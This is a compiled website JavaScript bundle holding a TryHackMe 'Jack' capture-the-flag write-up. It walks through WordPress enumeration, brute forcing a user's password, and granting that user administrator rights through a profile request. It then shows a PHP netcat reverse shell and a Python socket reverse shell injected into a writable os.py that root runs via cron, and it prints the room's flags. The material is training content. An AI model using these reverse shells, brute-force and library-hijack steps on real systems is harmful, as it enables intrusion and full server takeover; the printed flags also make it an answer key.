"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3409],{3905:(e,n,t)=>{t.d(n,{Zo:()=>_,kt:()=>m});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var c=r.createContext({}),p=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},_=function(e){var n=p(e.components);return r.createElement(c.Provider,{value:n},e.children)},l="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,c=e.parentName,_=i(e,["components","mdxType","originalType","parentName"]),l=p(t),u=o,m=l["".concat(c,".").concat(u)]||l[u]||d[u]||a;return t?r.createElement(m,s(s({ref:n},_),{},{components:t})):r.createElement(m,s({ref:n},_))}));function m(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,s=new Array(a);s[0]=u;var i={};for(var c in n)hasOwnProperty.call(n,c)&&(i[c]=n[c]);i.originalType=e,i[l]="string"==typeof e?e:o,s[1]=i;for(var p=2;p<a;p++)s[p]=t[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},54879:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>p});var r=t(87462),o=(t(67294),t(3905));const a={},s="Jack",i={unversionedId:"Tryhackme/Jack/Jack",id:"Tryhackme/Jack/Jack",title:"Jack",description:"Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.",source:"@site/writeups/Tryhackme/Jack/Jack.md",sourceDirName:"Tryhackme/Jack",slug:"/Tryhackme/Jack/",permalink:"/writeups/Tryhackme/Jack/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Iron Corp",permalink:"/writeups/Tryhackme/Iron Corp/"},next:{title:"Jack-of-All-Trades",permalink:"/writeups/Tryhackme/Jack-of-All-Trades/"}},c={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy &amp; Root",id:"task-1-deploy--root",level:2}],_={toc:p},l="wrapper";function d(e){let{components:n,...a}=e;return(0,o.kt)(l,(0,r.Z)({},_,a,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"jack"},"Jack"),(0,o.kt)("p",null,"Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/jack"},"Jack")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Enumeration (Wordpress)"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (Wordpress)"),(0,o.kt)("li",{parentName:"ul"},"Code Injection (RCE)"),(0,o.kt)("li",{parentName:"ul"},"Exploiting Crontab")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-deploy--root"},"Task 1 Deploy & Root"),(0,o.kt)("p",null,"Connect to our network and deploy this machine."),(0,o.kt)("p",null,"Add jack.thm to /etc/hosts"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack$ sudo nmap -Pn -sS -sC -sV -O 10.10.152.186\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 13:07 CEST\nNmap scan report for 10.10.152.186\nHost is up (0.037s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)\n|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)\n|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 5.3.2\n| http-robots.txt: 1 disallowed entry\n|_/wp-admin/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=41953%PV=Y%DS=2%DC=I%G=Y%TM=5F8438\nOS:FA%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.27 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.152.186/robots.txt"},"http://10.10.152.186/robots.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"User-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack$ wpscan --url http://jack.thm -e u\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://jack.thm/ [10.10.152.186]\n[+] Started: Mon Oct 12 13:10:41 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] http://jack.thm/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://jack.thm/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).\n | Found By: Rss Generator (Passive Detection)\n |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>\n |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>\n\n[+] WordPress theme in use: online-portfolio\n | Location: http://jack.thm/wp-content/themes/online-portfolio/\n | Last Updated: 2020-08-18T00:00:00.000Z\n | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt\n | [!] The version is out of date, the latest version is 0.0.9\n | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2\n | Style Name: Online Portfolio\n | Style URI: https://www.amplethemes.com/downloads/online-protfolio/\n | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...\n | Author: Ample Themes\n | Author URI: https://amplethemes.com/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 0.0.7 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:01 <==========================================================================================================================> (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] jack\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] wendy\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] danny\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Mon Oct 12 13:10:53 2020\n[+] Requests Done: 56\n[+] Cached Requests: 9\n[+] Data Sent: 11.852 KB\n[+] Data Received: 355.445 KB\n[+] Memory used: 152.977 MB\n[+] Elapsed time: 00:00:11\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"jack\nwendy\ndanny\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack$ wpscan -U users.txt -P /usr/share/wordlists/fasttrack.txt --url http://jack.thm\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://jack.thm/ [10.10.152.186]\n[+] Started: Mon Oct 12 13:38:50 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] http://jack.thm/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://jack.thm/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).\n | Found By: Rss Generator (Passive Detection)\n |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>\n |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>\n\n[+] WordPress theme in use: online-portfolio\n | Location: http://jack.thm/wp-content/themes/online-portfolio/\n | Last Updated: 2020-08-18T00:00:00.000Z\n | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt\n | [!] The version is out of date, the latest version is 0.0.9\n | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2\n | Style Name: Online Portfolio\n | Style URI: https://www.amplethemes.com/downloads/online-protfolio/\n | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...\n | Author: Ample Themes\n | Author URI: https://amplethemes.com/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 0.0.7 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:02 <===========================================================================================================================> (21 / 21) 100.00% Time: 00:00:02\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Xmlrpc against 3 user/s\n[SUCCESS] - wendy / changelater\nTrying danny / starwars Time: 00:01:08 <============================================================================================================================> (646 / 646) 100.00% Time: 00:01:08\n\n[!] Valid Combinations Found:\n | Username: wendy, Password: changelater\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Mon Oct 12 13:40:16 2020\n[+] Requests Done: 698\n[+] Cached Requests: 7\n[+] Data Sent: 324.727 KB\n[+] Data Received: 558.854 KB\n[+] Memory used: 228.52 MB\n[+] Elapsed time: 00:01:26\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://jack.thm/wp-login.php"},"http://jack.thm/wp-login.php")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(35444).Z,width:"367",height:"500"})),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"POST /wp-admin/profile.php HTTP/1.1\nHost: jack.thm\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://jack.thm/wp-admin/profile.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 312\nConnection: close\nCookie: wordpress_07f87507b491ce41808428c8c499655c=wendy%7C1602675701%7CI7Ot38YvXPOKQfaBnWyDL0Wz6a3xHz9vOPfbabJ2a4L%7Cecd72d0370bab37d3d470a95617ece07a1e1d67a1519deed59f6c24395f0e529; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_07f87507b491ce41808428c8c499655c=wendy%7C1602675701%7CI7Ot38YvXPOKQfaBnWyDL0Wz6a3xHz9vOPfbabJ2a4L%7C8f0b5e17676e9f7560c2a730d24c08aa2a39b68e405f4ac4faeade15928dd0fa; wp-settings-time-2=1602503110\nUpgrade-Insecure-Requests: 1\n\n_wpnonce=61da004af8&_wp_http_referer=%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=e55d209ef2&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=wendy&display_name=wendy&email=wendy%40tryhackme.com&url=&description=&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile&ure_other_roles=administrator\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 4444 >/tmp/f');\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack$ nc -nlvp 4444\nlistening on [any] 4444 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.152.186] 35670\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n$ cd /home/jack/\n$ ls -la\ntotal 36\ndrwxr-xr-x 4 jack jack 4096 Jan 10  2020 .\ndrwxr-xr-x 3 root root 4096 Jan  8  2020 ..\nlrwxrwxrwx 1 jack jack    9 Jan 10  2020 .bash_history -> /dev/null\n-rw-r--r-- 1 jack jack  220 Jan  8  2020 .bash_logout\n-rw-r--r-- 1 jack jack 3771 Jan  8  2020 .bashrc\ndrwx------ 2 jack jack 4096 Jan  9  2020 .cache\n-rw-r--r-- 1 jack jack  655 Jan  8  2020 .profile\ndrwx------ 2 jack jack 4096 Jan 10  2020 .ssh\n-rw-r--r-- 1 root root  140 Jan 10  2020 reminder.txt\n-rw-rw-r-- 1 jack jack   33 Jan 10  2020 user.txt\n$ cat user.txt\n0052f7829e48752f2e7bf50f1231548a\n$ cat /home/jack/reminder.txt\n\nPlease read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.\n\n$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"jack@jack:~$ chmod +x ./pspy64s\njack@jack:~$ ./pspy64s -pf -i 1000\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\n\n     \u2588\u2588\u2593\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593\u2588\u2588\u2588 \u2593\u2588\u2588   \u2588\u2588\u2593\n    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588  \u2588\u2588\u2592\n    \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2591 \u2593\u2588\u2588\u2584   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592 \u2592\u2588\u2588 \u2588\u2588\u2591\n    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592 \u2591 \u2590\u2588\u2588\u2593\u2591\n    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2591 \u2588\u2588\u2592\u2593\u2591\n    \u2592\u2593\u2592\u2591 \u2591  \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591  \u2591  \u2588\u2588\u2592\u2592\u2592\n    \u2591\u2592 \u2591     \u2591 \u2591\u2592  \u2591 \u2591\u2591\u2592 \u2591     \u2593\u2588\u2588 \u2591\u2592\u2591\n    \u2591\u2591       \u2591  \u2591  \u2591  \u2591\u2591       \u2592 \u2592 \u2591\u2591\n                   \u2591           \u2591 \u2591\n                               \u2591 \u2591\n\nConfig: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)\nDraining file system events due to startup...\ndone\n2020/10/12 07:04:01 CMD: UID=0    PID=12856  | /usr/bin/python /opt/statuscheck/checker.py\n2020/10/12 07:04:01 CMD: UID=0    PID=12855  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'jack@jack:~$ cd /opt/statuscheck\njack@jack:/opt/statuscheck$ ls -la\ntotal 24\ndrwxr-xr-x 2 root root  4096 Jan 10  2020 .\ndrwxr-xr-x 3 root root  4096 Jan 10  2020 ..\n-rw-r--r-- 1 root root    92 Jan 10  2020 checker.py\n-rw-r--r-- 1 root root 10098 Oct 12 07:04 output.log\njack@jack:/opt/statuscheck$ cat checker.py\nimport os\n\nos.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")\njack@jack:/opt/statuscheck$ ls -l /usr/lib/python2.7/os.py\n-rw-rw-r-x 1 root family 25908 Jan 10  2020 /usr/lib/python2.7/os.py\njack@jack:/opt/statuscheck$ nano /usr/lib/python2.7/os.py\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import socket\nimport pty\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.9.0.54",5555))\ndup2(s.fileno(),0)\ndup2(s.fileno(),1)\ndup2(s.fileno(),2)\npty.spawn("/bin/bash")\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack$ nc -nlvp 5555listening on [any] 5555 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.152.186] 33860\nroot@jack:~# whoami\nwhoami\nroot\nroot@jack:~# cd /root\ncd /root\nroot@jack:~# ls\nls\nroot.txt\nroot@jack:~# cat root.txt\ncat root.txt\nb8b63a861cc09e853f29d8055d64bffb\nroot@jack:~#\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Gain initial access and obtain the user flag.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"0052f7829e48752f2e7bf50f1231548a")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Escalate your privileges to root. Whats the root flag?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"b8b63a861cc09e853f29d8055d64bffb")))}d.isMDXComponent=!0},35444:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-12_13-41-20b3b2d7955ced69fc5ed7355ecb8c0f.png"}}]);